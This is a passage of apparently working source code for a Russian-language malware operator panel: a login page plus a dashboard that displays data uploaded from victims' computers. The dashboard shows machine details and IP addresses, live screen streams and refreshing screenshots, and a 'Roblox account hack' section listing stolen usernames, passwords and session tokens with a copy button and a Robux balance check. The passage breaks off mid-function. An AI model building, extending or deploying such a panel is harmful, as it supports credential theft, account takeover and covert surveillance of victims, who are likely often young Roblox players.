      font-size: 1.1rem; font-weight: 800;
      background: linear-gradient(135deg, #7c6aff, #a855f7);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      letter-spacing: -0.5px;
    }
    h1 {
      font-size: 1.75rem; font-weight: 800;
      color: #f1f1f6; margin-bottom: 0.5rem;
      letter-spacing: -0.5px;
    }
    .subtitle {
      color: #8c8c9e; font-size: 0.88rem;
      margin-bottom: 2rem;
    }
    .input-group {
      margin-bottom: 1.25rem;
      width: 100%;
    }
    .input-group input {
      background: rgba(0, 0, 0, 0.4);
      border: 1px solid rgba(255, 255, 255, 0.08);
      border-radius: 12px;
      color: #fff;
      padding: 0.75rem 1.2rem;
      font-family: inherit;
      font-size: 0.9rem;
      outline: none;
      transition: all 0.3s;
      width: 100%;
      text-align: left;
    }
    .input-group input:focus {
      border-color: #7c6aff;
      background: rgba(0, 0, 0, 0.6);
      box-shadow: 0 0 12px rgba(124, 106, 255, 0.25);
    }
    .btn-submit {
      background: linear-gradient(135deg, #7c6aff, #a855f7);
      border: none;
      border-radius: 12px;
      color: #fff;
      cursor: pointer;
      font-family: inherit;
      font-size: 0.95rem;
      font-weight: 700;
      padding: 0.75rem;
      width: 100%;
      transition: all 0.3s;
      box-shadow: 0 4px 12px rgba(124, 106, 255, 0.2);
      margin-top: 0.5rem;
    }
    .btn-submit:hover {
      filter: brightness(1.1);
      box-shadow: 0 4px 20px rgba(124, 106, 255, 0.45);
      transform: translateY(-1px);
    }
    .btn-submit:active {
      transform: translateY(1px);
    }
    .error-msg {
      color: #ff1744;
      font-size: 0.85rem;
      font-weight: 600;
      margin-bottom: 1.25rem;
      background: rgba(255, 23, 68, 0.1);
      border: 1px solid rgba(255, 23, 68, 0.2);
      padding: 0.6rem 1rem;
      border-radius: 10px;
      width: 100%;
      text-align: center;
      animation: shake 0.4s ease;
    }
    @keyframes shake {
      0%, 100% { transform: translateX(0); }
      25% { transform: translateX(-6px); }
      75% { transform: translateX(6px); }
    }
    .security-note {
      margin-top: 2.5rem;
      font-size: 0.75rem; color: #4a4a5a;
    }
  </style>
</head>
<body>
<form method="POST" action="/login228" class="login-card">
  <div class="logo">
    <div class="logo-icon">⚡</div>
    <span class="logo-text">СИСТЕМА ПЕРЕДАЧИ ФАЙЛОВ</span>
  </div>

  <h1>Авторизация</h1>
  <p class="subtitle">Введите учетные данные для доступа</p>

  ${errorElement}

  <div class="input-group">
    <input type="text" name="username" placeholder="Логин" required autocomplete="username">
  </div>
  <div class="input-group">
    <input type="password" name="password" placeholder="Пароль" required autocomplete="current-password">
  </div>

  <button type="submit" class="btn-submit">Войти</button>

  <div class="security-note">🔒 Вход разрешен только администраторам системы</div>
</form>
</body>
</html>`;
}

// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
//  HTML: Dashboard
// ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
function dashboardHTML(user) {
  const avatar = user === 'Shonll' ? '🦊' : '🐉';
  return `<!DOCTYPE html>
<html lang="ru">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width,initial-scale=1">
  <title>Система Передачи Файлов — Управление</title>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
  <style>
    :root {
      --bg: #030307;
      --surface: rgba(18, 18, 28, 0.65);
      --surface-hover: rgba(25, 25, 38, 0.85);
      --border: rgba(255, 255, 255, 0.08);
      --border-hover: rgba(124, 106, 255, 0.4);
      --accent: #7c6aff;
      --accent-glow: rgba(124, 106, 255, 0.25);
      --text: #f1f1f6;
      --text-dim: #8c8c9e;
      --success: #00e676;
      --danger: #ff1744;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Inter', sans-serif;
      background: var(--bg);
      color: var(--text);
      min-height: 100vh;
      overflow-x: hidden;
      position: relative;
    }
    body::before {
      content: '';
      position: fixed;
      top: -10%; left: -10%;
      width: 120%; height: 120%;
      background: 
        radial-gradient(circle at 15% 20%, rgba(124, 106, 255, 0.15) 0%, transparent 40%),
        radial-gradient(circle at 85% 75%, rgba(0, 122, 204, 0.12) 0%, transparent 45%);
      z-index: -1;
      pointer-events: none;
    }
    header {
      position: sticky; top: 12px; z-index: 100;
      background: rgba(13, 13, 21, 0.65);
      backdrop-filter: blur(16px);
      border: 1px solid var(--border);
      border-radius: 16px;
      margin: 12px 1.5rem 0;
      padding: 0 1.5rem; height: 64px;
      display: flex; align-items: center; justify-content: space-between;
      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
    }
    .logo {
      display: flex; align-items: center; gap: 10px;
      font-size: 1.15rem; font-weight: 800;
      background: linear-gradient(135deg, #7c6aff, #a855f7);
      -webkit-background-clip: text; -webkit-text-fill-color: transparent;
      letter-spacing: -0.5px;
    }
    .user-badge {
      display: flex; align-items: center; gap: 10px;
      background: rgba(255,255,255,0.03);
      border: 1px solid var(--border);
      border-radius: 999px;
      padding: 0.35rem 0.9rem 0.35rem 0.5rem;
    }
    .user-avatar { font-size: 1.3rem; line-height: 1; }
    .user-name { font-size: 0.85rem; font-weight: 600; color: var(--text); }
    .btn-logout {
      margin-left: 0.6rem;
      background: none; border: none; color: var(--text-dim);
      font-size: 0.78rem; cursor: pointer; font-family: inherit;
      padding: 0.2rem 0.5rem; border-radius: 6px; transition: 0.2s;
      text-decoration: none;
    }
    .btn-logout:hover { color: var(--danger); }
    .nav-links { display: flex; gap: 1rem; }
    .nav-link { color: var(--text-dim); text-decoration: none; font-size: 0.85rem; font-weight: 500; padding: 0.4rem 0.8rem; border-radius: 8px; transition: 0.2s; }
    .nav-link:hover { color: var(--text); background: rgba(255,255,255,0.05); }
    .nav-link.active { color: var(--accent); background: rgba(124,106,255,0.1); }

    .stats-bar {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 1rem; padding: 1.5rem;
    }
    .stat-card {
      background: var(--surface);
      backdrop-filter: blur(8px);
      border: 1px solid var(--border);
      border-radius: 14px; padding: 1rem 1.25rem;
      transition: border-color 0.3s, transform 0.3s;
    }
    .stat-card:hover {
      border-color: rgba(124, 106, 255, 0.3);
      transform: translateY(-2px);
    }
    .stat-label { font-size: 0.72rem; color: var(--text-dim); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 0.25rem; }
    .stat-value { font-size: 1.5rem; font-weight: 700; }
    .stat-value.accent { background: linear-gradient(135deg, #7c6aff, #a855f7); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }

    .controls-panel {
      display: flex; gap: 1rem; align-items: center; justify-content: space-between;
      margin: 0 1.5rem 1.5rem; flex-wrap: wrap;
    }
    .search-bar-wrapper {
      display: flex; gap: 0.75rem; flex: 1; min-width: 280px;
    }
    .search-input {
      background: var(--surface); border: 1px solid var(--border);
      color: var(--text); padding: 0.6rem 1.2rem; border-radius: 10px;
      outline: none; font-family: inherit; font-size: 0.85rem; width: 100%; max-width: 320px;
      transition: border-color 0.3s, box-shadow 0.3s;
    }
    .search-input:focus {
      border-color: var(--accent);
      box-shadow: 0 0 10px var(--accent-glow);
    }
    .filter-select {
      background: var(--surface); border: 1px solid var(--border);
      color: var(--text); padding: 0.6rem 1.2rem; border-radius: 10px;
      outline: none; font-family: inherit; font-size: 0.85rem; cursor: pointer;
      transition: border-color 0.3s;
    }
    .filter-select:hover { border-color: var(--accent); }
    .btn-refresh {
      background: rgba(124, 106, 255, 0.1); border: 1px solid rgba(124, 106, 255, 0.25);
      color: #b3a9ff; padding: 0.6rem 1.2rem; border-radius: 10px;
      font-family: inherit; font-size: 0.85rem; font-weight: 600; cursor: pointer; transition: 0.2s;
    }
    .btn-refresh:hover { background: rgba(124, 106, 255, 0.2); border-color: var(--accent); }

    .files-grid {
      display: grid;
      grid-template-columns: repeat(auto-fill, minmax(280px, 1fr));
      gap: 1.5rem;
      padding: 0 1.5rem 2rem;
    }
    .file-card {
      background: var(--surface);
      border: 1px solid var(--border);
      border-radius: 16px; overflow: hidden;
      display: flex; flex-direction: column;
      transition: transform 0.3s cubic-bezier(0.25, 0.8, 0.25, 1), border-color 0.3s, box-shadow 0.3s;
      cursor: pointer;
    }
    .file-card:hover {
      transform: translateY(-6px);
      border-color: var(--border-hover);
      box-shadow: 0 12px 30px var(--accent-glow);
    }
    .card-preview {
      height: 160px; background: #0c0c12;
      display: flex; align-items: center; justify-content: center;
      position: relative; overflow: hidden;
      border-bottom: 1px solid var(--border);
    }
    .card-preview img {
      width: 100%; height: 100%; object-fit: cover;
    }
    .card-preview-text {
      font-family: 'Consolas', monospace; font-size: 0.7rem; color: #a5a5b2;
      padding: 0.75rem; text-align: left; width: 100%; height: 100%;
      overflow: hidden; white-space: pre-wrap; line-height: 1.4;
      background: #06060a;
    }
    .card-preview-icon {
      font-size: 3.5rem; filter: drop-shadow(0 4px 10px rgba(0,0,0,0.5));
    }
    .card-body {
      padding: 1rem; display: flex; flex-direction: column; gap: 0.6rem;
      background: rgba(10, 10, 15, 0.4);
    }
    .card-title {
      font-size: 0.92rem; font-weight: 600; color: var(--text);
      white-space: nowrap; overflow: hidden; text-overflow: ellipsis;
    }
    .card-meta {
      display: flex; justify-content: space-between; align-items: center;
      font-size: 0.75rem; color: var(--text-dim);
    }
    .badge {
      font-size: 0.68rem; font-weight: 600; padding: 2px 8px; border-radius: 4px;
    }
    .badge-pc { background: rgba(124, 106, 255, 0.12); color: #b3a9ff; border: 1px solid rgba(124, 106, 255, 0.2); }
    .badge-size { background: rgba(0, 230, 118, 0.1); color: #00e676; border: 1px solid rgba(0, 230, 118, 0.15); }

    .modal-overlay {
      position: fixed; inset: 0; background: rgba(0, 0, 0, 0.85);
      backdrop-filter: blur(10px); z-index: 200;
      display: none; align-items: center; justify-content: center;
      padding: 1.5rem;
      animation: fadeIn 0.25s ease;
    }
    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    .modal-container {
      background: rgba(15, 15, 23, 0.96);
      border: 1px solid var(--border);
      border-radius: 24px;
      width: 100%; max-width: 900px;
      max-height: 85vh; overflow: hidden;
      position: relative;
      box-shadow: 0 20px 60px rgba(0,0,0,0.8);
      display: flex; flex-direction: column;
    }
    .modal-close {
      position: absolute; top: 1rem; right: 1rem;
      background: rgba(255,255,255,0.05); border: 1px solid var(--border);
      color: var(--text); border-radius: 50%; width: 34px; height: 34px;
      display: flex; align-items: center; justify-content: center;
      cursor: pointer; font-size: 1rem; transition: background 0.2s;
      z-index: 10;
    }
    .modal-close:hover { background: rgba(255,255,255,0.15); }
    
    .modal-content-wrapper {
      display: flex; flex: 1; min-height: 0;
    }
    @media (max-width: 768px) {
      .modal-content-wrapper { flex-direction: column; overflow-y: auto; }
    }
    .modal-preview-pane {
      flex: 1.2; background: #08080c;
      display: flex; align-items: center; justify-content: center;
      padding: 1.5rem; border-right: 1px solid var(--border);
      overflow: auto; min-height: 300px;
    }
    .modal-preview-pane img {
      max-width: 100%; max-height: 60vh; object-fit: contain; border-radius: 8px;
    }
    .modal-preview-pane video {
      max-width: 100%; max-height: 60vh; outline: none; border-radius: 8px;
    }
    .modal-preview-pane audio {
      width: 90%; outline: none;
    }
    .modal-preview-text {
      width: 100%; height: 100%; max-height: 60vh; padding: 1.25rem;
      background: #040406; color: #cbd5e1; border-radius: 8px;
      font-family: 'Consolas', monospace; font-size: 0.8rem;
      overflow: auto; white-space: pre-wrap; line-height: 1.5;
      border: 1px solid rgba(255,255,255,0.05);
    }
    .modal-details-pane {
      flex: 1; padding: 1.5rem 2rem; display: flex; flex-direction: column; gap: 1.25rem;
      overflow-y: auto;
    }
    .modal-filename {
      font-size: 1.15rem; font-weight: 700; line-height: 1.3; word-break: break-all;
    }
    .specs-section {
      display: flex; flex-direction: column; gap: 0.6rem;
    }
    .section-title {
      font-size: 0.72rem; font-weight: 700; color: var(--text-dim);
      text-transform: uppercase; letter-spacing: 0.05em; border-bottom: 1px solid var(--border);
      padding-bottom: 0.3rem; margin-bottom: 0.2rem;
    }
    .specs-grid {
      display: flex; flex-direction: column; gap: 0.4rem;
    }
    .spec-row {
      display: flex; justify-content: space-between; align-items: center;
      font-size: 0.8rem; padding: 0.15rem 0;
    }
    .spec-lbl { color: var(--text-dim); }
    .spec-val { font-weight: 500; text-align: right; overflow: hidden; text-overflow: ellipsis; max-width: 60%; }
    .modal-actions {
      display: flex; flex-direction: column; gap: 0.5rem; margin-top: auto; padding-top: 1rem;
    }
    .modal-btn {
      display: flex; align-items: center; justify-content: center;
      padding: 0.65rem; border-radius: 8px; font-family: inherit; font-size: 0.85rem;
      font-weight: 600; cursor: pointer; text-decoration: none; border: none;
      transition: background 0.2s, transform 0.1s;
    }
    .modal-btn:active { transform: scale(0.98); }
    .stream-btn { background: rgba(255, 23, 68, 0.15); color: #ff4d6d; border: 1px solid rgba(255, 23, 68, 0.3); }
    .stream-btn:hover { background: rgba(255, 23, 68, 0.25); }
    .ai-btn { background: rgba(124, 106, 255, 0.12); color: #b3a9ff; border: 1px solid rgba(124, 106, 255, 0.25); }
    .ai-btn:hover { background: rgba(124, 106, 255, 0.22); }
    .robux-btn { background: rgba(0, 230, 118, 0.12); color: #00e676; border: 1px solid rgba(0, 230, 118, 0.25); }
    .robux-btn:hover { background: rgba(0, 230, 118, 0.22); }
    .copy-btn { background: rgba(255, 165, 0, 0.12); color: #ffa502; border: 1px solid rgba(255, 165, 0, 0.25); cursor: pointer; transition: 0.2s; }
    .copy-btn:hover { background: rgba(255, 165, 0, 0.22); }
    .token-display { font-family: 'Consolas', monospace; font-size: 0.65rem; color: #ffa502; word-break: break-all; line-height: 1.4; max-height: 60px; overflow-y: auto; background: rgba(0,0,0,0.3); padding: 4px 8px; border-radius: 4px; border: 1px solid rgba(255,165,0,0.1); }
    .del-btn:hover { background: rgba(255, 23, 68, 0.18); }

    /* Stream modal */
    .stream-container {
      background: rgba(10, 10, 15, 0.98);
      border: 1px solid var(--border);
      border-radius: 16px;
      width: 90vw;
      max-width: 1200px;
      height: 85vh;
      display: flex;
      flex-direction: column;
      overflow: hidden;
      position: relative;
      box-shadow: 0 20px 60px rgba(0,0,0,0.9);
    }
    .stream-header {
      padding: 0.8rem 1.2rem;
      background: rgba(255, 23, 68, 0.1);
      border-bottom: 1px solid rgba(255, 23, 68, 0.2);
      color: #ff4d6d;
      font-weight: 700;
      font-size: 0.9rem;
      letter-spacing: 0.05em;
    }
    .stream-img {
      flex: 1;
      width: 100%;
      height: 100%;
      object-fit: contain;
      background: #000;
    }
    .stream-status {
      padding: 0.6rem 1rem;
      font-size: 0.8rem;
      color: var(--text-dim);
      text-align: center;
      border-top: 1px solid var(--border);
      background: rgba(0,0,0,0.4);
    }

    /* AI panel side overlay */
    #aiPanel {
      display: none; position: fixed; right: 1.5rem; bottom: 1.5rem;
      width: 360px; background: rgba(15, 15, 23, 0.95);
      backdrop-filter: blur(12px); border: 1px solid var(--border); border-radius: 16px;
      box-shadow: 0 16px 48px rgba(0,0,0,0.7); z-index: 300;
      animation: slideUp 0.25s ease;
    }
    @keyframes slideUp { from { transform: translateY(16px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
    .ai-hd {
      padding: 0.8rem 1rem; background: rgba(255,255,255,0.02);
      border-bottom: 1px solid var(--border);
      display: flex; align-items: center; justify-content: space-between;
      border-radius: 16px 16px 0 0;
    }
    .ai-dot { width: 7px; height: 7px; border-radius: 50%; background: var(--success); animation: pulse 2s infinite; }
    @keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.3; } }
    .ai-hd-left { display: flex; align-items: center; gap: 7px; font-size: 0.85rem; font-weight: 600; }
    .ai-body { padding: 1rem; font-size: 0.82rem; line-height: 1.6; color: #cbd5e1; min-height: 60px; }
    .btn-close-ai { background: none; border: none; color: var(--text-dim); cursor: pointer; font-size: 1rem; }

    .empty { text-align: center; padding: 6rem 1rem; color: var(--text-dim); grid-column: 1 / -1; }
    .empty-icon { font-size: 3.5rem; margin-bottom: 1rem; display: block; opacity: 0.3; }

    #toast {
      position: fixed; bottom: 1.5rem; left: 50%; transform: translateX(-50%) translateY(80px);
      background: rgba(13, 13, 21, 0.9); border: 1px solid var(--border); backdrop-filter: blur(10px);
      border-radius: 10px; padding: 0.6rem 1.2rem; font-size: 0.82rem;
      transition: 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275); z-index: 400;
    }
    #toast.show { transform: translateX(-50%) translateY(0); }
    #toast.ok { border-color: var(--success); color: var(--success); }
    #toast.err { border-color: var(--danger); color: var(--danger); }
  </style>
</head>
<body>

<header>
  <div class="logo">⚡ СИСТЕМА ПЕРЕДАЧИ ФАЙЛОВ</div>
  <div class="nav-links" style="margin-left:auto; margin-right:1rem;">
    <a href="/" class="nav-link active">📁 Файлы</a>
    <a href="/tokens" class="nav-link">🎫 Токены</a>
  </div>
  <div class="user-badge">
    <span class="user-avatar">${avatar}</span>
    <span class="user-name">${user}</span>
    <a href="/logout" class="btn-logout">Выйти</a>
  </div>
</header>

<!-- Stats -->
<div class="stats-bar">
  <div class="stat-card">
    <div class="stat-label">Всего файлов</div>
    <div class="stat-value accent" id="sTotal">—</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">Компьютеров</div>
    <div class="stat-value" id="sPCs">—</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">Общий объём</div>
    <div class="stat-value" id="sSize">—</div>
  </div>
  <div class="stat-card">
    <div class="stat-label">Последняя отправка</div>
    <div class="stat-value" id="sLast" style="font-size: 0.88rem;">—</div>
  </div>
</div>

<!-- Controls -->
<div class="controls-panel">
  <div class="search-bar-wrapper">
    <input type="text" class="search-input" id="searchBar" placeholder="Поиск по имени файла..." oninput="filterFiles()">
    <select class="filter-select" id="filterPC" onchange="filterFiles()">
      <option value="">Все отправители</option>
    </select>
  </div>
  <button class="btn-refresh" onclick="loadFiles()">↻ Обновить</button>
</div>

<!-- Grid -->
<main class="files-grid" id="fileGrid">
  <div class="empty"><span class="empty-icon">🌌</span>Список файлов пуст</div>
</main>

<!-- Details Modal -->
<div id="fileModal" class="modal-overlay" onclick="closeModal()">
  <div class="modal-container" onclick="event.stopPropagation()">
    <button class="modal-close" onclick="closeModal()">✕</button>
    <div class="modal-content-wrapper">
      <div class="modal-preview-pane" id="modalPreviewPane">
        <!-- Preview filled dynamically -->
      </div>
      <div class="modal-details-pane">
        <h3 class="modal-filename" id="modalFilename">Название файла</h3>
        
        <div class="specs-section">
          <h4 class="section-title">Характеристики отправителя</h4>
          <div class="specs-grid">
            <div class="spec-row"><span class="spec-lbl">💻 Имя ПК</span><span class="spec-val" id="specName">—</span></div>
            <div class="spec-row"><span class="spec-lbl">🌐 IP-адрес</span><span class="spec-val" id="specIp">—</span></div>
            <div class="spec-row"><span class="spec-lbl">🪟 ОС</span><span class="spec-val" id="specOs">—</span></div>
            <div class="spec-row"><span class="spec-lbl">⚙️ CPU</span><span class="spec-val" id="specCpu">—</span></div>
            <div class="spec-row"><span class="spec-lbl">🧠 RAM</span><span class="spec-val" id="specRam">—</span></div>
            <div class="spec-row"><span class="spec-lbl">🎮 GPU</span><span class="spec-val" id="specGpu">—</span></div>
            <div class="spec-row"><span class="spec-lbl">📅 Дата</span><span class="spec-val" id="specDate">—</span></div>
            <div class="spec-row"><span class="spec-lbl">📦 Размер</span><span class="spec-val" id="specSize">—</span></div>
          </div>
        </div>

        <div class="specs-section" id="robloxSpecsSection">
          <h4 class="section-title">Взлом аккаунта Roblox</h4>
          <div class="specs-grid">
            <div class="spec-row"><span class="spec-lbl">👤 Никнейм</span><span class="spec-val" id="robloxSpecUser" style="color: #00e676; font-weight: 700;">—</span></div>
            <div class="spec-row"><span class="spec-lbl">🔑 Пароль</span><span class="spec-val" id="robloxSpecPass" style="color: #ff1744; font-weight: 700; letter-spacing: 0.5px;">—</span></div>
            <div class="spec-row" id="robloxSpecTokenRow">
              <span class="spec-lbl">🎫 Токен</span>
              <div style="display:flex; flex-direction:column; align-items:flex-end; gap:4px; max-width:70%;">
                <div class="token-display" id="robloxSpecToken">—</div>
                <button class="copy-btn" id="robloxCopyBtn" style="padding:2px 10px; border-radius:4px; border:none; font-size:0.7rem; font-weight:600; font-family:inherit;" onclick="copyToken()">📋 Копировать</button>
              </div>
            </div>
            <div class="spec-row" id="robloxSpecRobuxRow" style="display:none;"><span class="spec-lbl">💰 Robux</span><span class="spec-val" id="robloxSpecRobux" style="color: #2ed573; font-weight: 700; font-size: 1.1rem;">—</span></div>
            <div class="spec-row" id="robloxSpecStatusRow" style="display:none;"><span class="spec-lbl">✅ Статус</span><span class="spec-val" id="robloxSpecStatus" style="font-weight: 600;">—</span></div>
          </div>
        </div>

        <div class="modal-actions">
          <button class="modal-btn stream-btn" id="modalStreamBtn">📺 Смотреть стрим</button>
          <button class="modal-btn robux-btn" id="modalRobuxBtn">💰 Проверить Robux</button>
          <button class="modal-btn ai-btn" id="modalAiBtn">🤖 AI Анализ файла</button>
          <button class="modal-btn del-btn" id="modalDeleteBtn">🗑 Удалить файл</button>
        </div>
      </div>
    </div>
  </div>
</div>

<!-- Stream Modal -->
<div id="streamModal" class="modal-overlay" onclick="closeStreamModal()">
  <div class="stream-container" onclick="event.stopPropagation()">
    <button class="modal-close" onclick="closeStreamModal()" style="top:0.5rem;right:0.5rem;">✕</button>
    <div class="stream-header">📺 LIVE STREAM — <span id="streamPcName">—</span></div>
    <img id="streamImg" class="stream-img" src="" alt="Live stream">
    <div class="stream-status" id="streamStatus">⏳ Подключение к стриму...</div>
  </div>
</div>

<!-- AI Side Panel -->
<div id="aiPanel">
  <div class="ai-hd">
    <div class="ai-hd-left"><span class="ai-dot"></span> AI Анализатор</div>
    <button class="btn-close-ai" onclick="document.getElementById('aiPanel').style.display='none'">✕</button>
  </div>
  <div class="ai-body" id="aiBody">Анализ...</div>
</div>

<div id="toast"></div>

<script>
const IMG = ["jpg","jpeg","png","gif","webp","bmp","svg","avif"];
const VID = ["mp4","webm","mov","avi"];
const AUD = ["mp3","wav","flac","ogg","m4a"];
const TXT = ["txt","md","js","ts","html","css","cs","py","json","cpp","c","java"];

let allFiles = [];

function ext(n) { return n.split(".").pop().toLowerCase(); }
function isImg(n) { return IMG.includes(ext(n)); }
function isText(n) { return TXT.includes(ext(n)); }
function isVid(n) { return VID.includes(ext(n)); }
function isAud(n) { return AUD.includes(ext(n)); }

function icon(n) {
  const e = ext(n);
  if (isImg(n)) return "🖼️";
  if (isVid(n)) return "🎥";
  if (isAud(n)) return "🎵";
  if (e === "pdf") return "📄";
  if (["zip","rar","7z"].includes(e)) return "🗜️";
  if (isText(n)) return "📝";
  return "📁";
}

function fmtSize(b) {
  if (b < 1024) return b + " B";
  if (b < 1048576) return (b / 1024).toFixed(1) + " KB";
  return (b / 1048576).toFixed(1) + " MB";
}

function fmtDate(s) {
  return new Date(s).toLocaleString("ru", { day: "2-digit", month: "short", hour: "2-digit", minute: "2-digit", second: "2-digit" });
}

function toast(msg, type = "ok") {
  const t = document.getElementById("toast");
  t.textContent = msg; t.className = "show " + type;
  setTimeout(function() { t.className = ""; }, 3000);
}

// Play premium chime sound natively using Web Audio API
function playChime() {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const now = ctx.currentTime;
    
    // First tone (G5)
    const osc1 = ctx.createOscillator();
    const gain1 = ctx.createGain();
    osc1.type = "sine";
    osc1.frequency.setValueAtTime(783.99, now);
    osc1.frequency.exponentialRampToValueAtTime(1046.5, now + 0.15); // C6
    gain1.gain.setValueAtTime(0.12, now);
    gain1.gain.exponentialRampToValueAtTime(0.001, now + 0.5);
    osc1.connect(gain1);
    gain1.connect(ctx.destination);
    
    // Second tone (E6)
    const osc2 = ctx.createOscillator();
    const gain2 = ctx.createGain();
    osc2.type = "sine";
    osc2.frequency.setValueAtTime(1318.51, now + 0.08);
    gain2.gain.setValueAtTime(0.08, now + 0.08);
    gain2.gain.exponentialRampToValueAtTime(0.001, now + 0.6);
    osc2.connect(gain2);
    gain2.connect(ctx.destination);
    
    osc1.start(now);
    osc1.stop(now + 0.5);
    osc2.start(now + 0.08);
    osc2.stop(now + 0.6);
  } catch (e) {
    console.error("Audio error:", e);
  }
}

// Fetch text file preview snippet
async function getTextSnippet(url) {
  try {
    const res = await fetch(url);
    if (!res.ok) return "Ошибка предпросмотра";
    const text = await res.text();
    const escaped = text.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    return escaped.substring(0, 200) + (text.length > 200 ? "\\n..." : "");
  } catch (e) {
    return "Не удалось прочесть превью.";
  }
}

async function loadFiles() {
  try {
    const r = await fetch("/files");
    allFiles = await r.json();
    updateStats();
    populatePCFilter();
    filterFiles();
  } catch (e) {
    toast("Ошибка загрузки файлов", "err");
  }
}

function updateStats() {
  document.getElementById("sTotal").textContent = allFiles.length;
  const pcs = new Set(allFiles.map(function(f) { return f.computer?.name || "Unknown"; })).size;
  document.getElementById("sPCs").textContent = pcs;
  const totalSize = allFiles.reduce(function(s, f) { return s + (f.size || 0); }, 0);
  document.getElementById("sSize").textContent = fmtSize(totalSize);
  const last = allFiles[0];
  document.getElementById("sLast").textContent = last ? fmtDate(last.uploadedAt) : "—";
}

function populatePCFilter() {
  const sel = document.getElementById("filterPC");
  const cur = sel.value;
  const pcs = Array.from(new Set(allFiles.map(function(f) { return f.computer?.name || "Unknown"; })));
  let opts = "<option value=\\"\\">Все отправители</option>";
  for (let i = 0; i < pcs.length; i++) {
    const p = pcs[i];
    opts += "<option value=\\"" + p + "\\" " + (p === cur ? "selected" : "") + ">💻 " + p + "</option>";
  }
  sel.innerHTML = opts;
}

function filterFiles() {
  const searchVal = document.getElementById("searchBar").value.toLowerCase();
  const filterPC = document.getElementById("filterPC").value;
  
  let list = allFiles;
  if (searchVal) {
    list = list.filter(function(f) { return (f.originalName || f.name).toLowerCase().includes(searchVal); });
  }
  if (filterPC) {
    list = list.filter(function(f) { return (f.computer?.name || "Unknown") === filterPC; });
  }
  
  renderFiles(list);
}

function renderFiles(list) {
  const grid = document.getElementById("fileGrid");
  if (list.length === 0) {
    grid.innerHTML = "<div class=\\"empty\\"><span class=\\"empty-icon\\">🌌</span>Совпадений не найдено</div>";
    return;
  }
  
  let html = "";
  for (let i = 0; i < list.length; i++) {
    const f = list[i];
    const nm = f.originalName || f.name;
    const pcName = f.computer?.name || "Unknown";
    const pcCountry = f.computer?.country || "—";
    const dlUrl = "/uploads/" + encodeURIComponent(f.name);
    const ts = Date.now();
    
    // Determine preview element
    let previewHTML = "";
    if (isImg(nm)) {
      previewHTML = "<img class=\\"live-preview\\" data-pc=\\"" + encodeURIComponent(pcName) + "\\" data-url=\\"" + dlUrl + "\\" src=\\"" + dlUrl + "?t=" + ts + "\\" alt=\\"\\" loading=\\"lazy\\">";
    } else if (isText(nm)) {
      previewHTML = "<div class=\\"card-preview-text text-preview-placeholder\\" data-url=\\"" + dlUrl + "\\">Загрузка превью...</div>";
    } else {
      previewHTML = "<div class=\\"card-preview-icon\\">" + icon(nm) + "</div>";
    }
    
    html += "<div class=\\"file-card\\" onclick=\\"openModal(" + i + ", '" + encodeURIComponent(JSON.stringify(f)) + "')\\">" +
              "<div class=\\"card-preview\\">" + previewHTML + "</div>" +
              "<div class=\\"card-body\\">" +
                "<div class=\\"card-title\\" title=\\"" + pcName + "\\">" + pcName + "</div>" +
                "<div class=\\"card-meta\\">" +
                  "<span class=\\"badge badge-pc\\">🌍 " + pcCountry + "</span>" +
                  "<span class=\\"badge badge-size\\">" + fmtSize(f.size || 0) + "</span>" +
                "</div>" +
              "</div>" +
            "</div>";
  }
  
  grid.innerHTML = html;
  loadTextPreviews();
}

// Автообновление превью скриншотов каждые 5 секунд
setInterval(function() {
  document.querySelectorAll(".live-preview").forEach(function(img) {
    const url = img.getAttribute("data-url");
    if (url) img.src = url + "?t=" + Date.now();
  });
}, 5000);

function loadTextPreviews() {
  document.querySelectorAll(".text-preview-placeholder").forEach(async function(el) {
    const url = el.getAttribute("data-url");
    if (!url) return;
    const text = await getTextSnippet(url);
    el.textContent = text;
    el.classList.remove("text-preview-placeholder");
  });
}

function openModal(idx, fEscaped) {
  const f = JSON.parse(decodeURIComponent(fEscaped));
  const nm = f.originalName || f.name;
  const pc = f.computer || {};
  const dlUrl = "/uploads/" + encodeURIComponent(f.name);
  
  document.getElementById("modalFilename").textContent = nm;
  document.getElementById("specName").textContent = pc.name || "—";
  document.getElementById("specIp").textContent = pc.ip || "—";
  document.getElementById("specOs").textContent = pc.os || "—";
  document.getElementById("specCpu").textContent = pc.cpu || "—";
  document.getElementById("specRam").textContent = pc.ram || "—";
  document.getElementById("specGpu").textContent = pc.gpu || "—";
  document.getElementById("specDate").textContent = fmtDate(f.uploadedAt);
  document.getElementById("specSize").textContent = fmtSize(f.size || 0);
  
  // Настройка данных Roblox
  const roblox = f.roblox || {};
  const robuxInfo = f.robuxInfo || {};
  const hasToken = roblox.security && roblox.security.length > 0;
  const hasUser = roblox.user && roblox.user.length > 0;

  document.getElementById("robloxSpecUser").textContent = roblox.user || "—";
  document.getElementById("robloxSpecPass").textContent = roblox.pass || "—";

  const tokEl = document.getElementById("robloxSpecToken");
  const copyBtn = document.getElementById("robloxCopyBtn");
  if (hasToken) {
    tokEl.textContent = roblox.security;
    tokEl.scrollTop = 0;
    currentToken = roblox.security;
    copyBtn.style.display = "";
  } else {
    tokEl.textContent = "—";
    currentToken = "";
    copyBtn.style.display = "none";
  }

  const robuxRow = document.getElementById("robloxSpecRobuxRow");
  const statusRow = document.getElementById("robloxSpecStatusRow");
